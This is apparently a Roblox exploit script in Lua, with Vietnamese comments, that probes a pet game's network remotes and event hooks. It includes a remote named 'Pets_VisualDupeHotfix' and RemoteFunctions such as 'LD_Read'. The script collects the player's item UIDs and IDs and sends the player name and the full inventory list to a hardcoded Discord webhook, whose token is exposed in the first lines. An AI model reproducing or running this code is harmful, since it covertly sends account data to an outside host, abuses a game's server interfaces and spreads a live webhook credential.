-- Kho v10 - Hook nhiều event + thử LD_Read / Get_Player_Profile
local W="https://discord.com/api/webhooks/1502609152025952338/9TmUzZ2jRGfdu0tNYMz7lci6s42oYO1Pxj6MvlAU_x8qiMTxcU2awczwsHeYb3SaCDsD"
local Http=game:GetService("HttpService")
local RS=game:GetService("ReplicatedStorage")
local plr=game:GetService("Players").LocalPlayer
local Net=RS.Network

local function d(msg,c) pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=Http:JSONEncode({embeds={{description=msg,color=c or 0x00ccff}}})}) end) wait(1) end

d("🟡 **KHO v10** | `"..plr.Name.."`", 0xffaa00)

local seen={} local uidLines={} local total=0
local function addItem(uid,id)
    uid=tostring(uid or ""); id=tostring(id or "")
    if #uid>3 and #id>0 and not seen[uid] then
        seen[uid]=true; table.insert(uidLines, uid.."|"..id); total=total+1
    end
end

local function scanData(t, depth)
    if depth>4 or type(t)~="table" then return end
    for _,v in pairs(t) do
        if type(v)=="table" then
            local uid=v.uid or v.Uid or v.UID
            local id=(type(v.data)=="table" and v.data.id) or v.id or v.Id or v.name
            if uid and id then addItem(uid,id)
            else scanData(v, depth+1) end
        end
    end
end

-- =====================================================
-- BƯỚC 1: Equipped (đã hoạt động)
-- =====================================================
local ok,PPC=pcall(require, RS.Library.Client.PlayerProfileCmds)
if ok then
    local _,data=pcall(PPC.GetPlayerData, plr.UserId)
    if type(data)=="table" and type(data.Equipped)=="table" then
        for _,item in pairs(data.Equipped) do
            if type(item)=="table" then
                addItem(item.uid, type(item.data)=="table" and item.data.id or item.data)
            end
        end
        d("✅ Equipped: "..total.." unique", 0x00ff00)
    end
end

-- =====================================================
-- BƯỚC 2: Hook NHIỀU event cùng lúc, fire trigger
-- =====================================================
d("🔄 Hook multi-events + fire triggers...", 0xffaa00)

local fired = {}
local conns = {}
local eventsBefore = total

-- List các event cần hook
local hookNames = {
    "Pets_LocalPetsUpdated",
    "Pets_ReplicateEquip",
    "Pets_ReplicateChanges",
    "Items: Update",
}

for _, evName in ipairs(hookNames) do
    local ok2, ev = pcall(function() return Net[evName] end)
    if ok2 and ev then
        local conn; conn = pcall(function()
            conn = ev.OnClientEvent:Connect(function(...)
                local args={...}
                if not fired[evName] then
                    fired[evName] = true
                    -- Scan args
                    for _,arg in ipairs(args) do scanData({arg},0) end
                end
            end)
            table.insert(conns, conn)
        end)
    end
end

-- Fire triggers
local triggers = {"Inventory_Opened", "Pets_Restore", "Pets_VisualDupeHotfix"}
for _, name in ipairs(triggers) do
    pcall(function() Net[name]:FireServer() end)
    wait(0.5)
end

-- Thử InvokeServer các RemoteFunction
local rfNames = {"Get_Player_Profile", "Pets_GetEquipped", "LD_Read", "Transferring_Get"}
for _, name in ipairs(rfNames) do
    local ok3, rf = pcall(function() return Net[name] end)
    if ok3 and rf and rf.ClassName=="RemoteFunction" then
        local rok, rdata = pcall(function() return rf:InvokeServer() end)
        if rok and rdata~=nil then
            d("✅ **"..name.."** trả về: `"..type(rdata).."`", 0x00ff88)
            scanData({rdata}, 0)
            if type(rdata)=="table" then
                -- Dump sample
                local sample={}
                for k,v in pairs(rdata) do
                    table.insert(sample, tostring(k).."="..type(v))
                    if #sample>=6 then break end
                end
                d("`"..name.."` keys: `"..table.concat(sample,", ").."`", 0x5599ff)
            end
        end
    end
end

-- Đợi events fire
wait(10)

-- Disconnect
for _,conn in ipairs(conns) do pcall(function() conn:Disconnect() end) end

-- Report which events fired
local firedList={}
for k in pairs(fired) do table.insert(firedList, k) end
if #firedList>0 then
    d("📡 Events fired: "..table.concat(firedList,", "), 0x00ff88)
else
    d("⚠️ Không event nào fire trong 10s", 0xff8800)
end

local newItems = total - eventsBefore
if newItems>0 then d("✅ +"..newItems.." items từ events!", 0x00ff88) end

-- =====================================================
-- Kết quả
-- =====================================================
if total==0 then d("❌ Không có item!", 0xff0000) return end
table.sort(uidLines,function(a,b)
    local _,an=a:match("^([^|]+)|(.+)$")
    local _,bn=b:match("^([^|]+)|(.+)$")
    return (an or a)<(bn or b)
end)

local function sendList(title,lines)
    local N=30; local pages=math.ceil(#lines/N)
    for p=1,pages do
        local from=(p-1)*N+1; local to=math.min(p*N,#lines); local chunk={}
        for i=from,to do table.insert(chunk,lines[i]) end
        pcall(function() request({Url=W,Method="POST",Headers={["Content-Type"]="application/json"},
            Body=Http:JSONEncode({embeds={{title=string.format("%s (%d/%d)",title,p,pages),
            description="```\n"..table.concat(chunk,"\n").."\n```",
            footer={text=string.format("%d-%d/%d",from,to,#lines)},color=0x00ff88}}})}) end)
        wait(2.5)
    end
end
d("📦 **"..total.." items** – gửi...", 0x00ccff); wait(0.5)
sendList("Kho ["..plr.Name.."]", uidLines)
d("🏁 **XONG!** | "..total.." items", 0x00ff88)
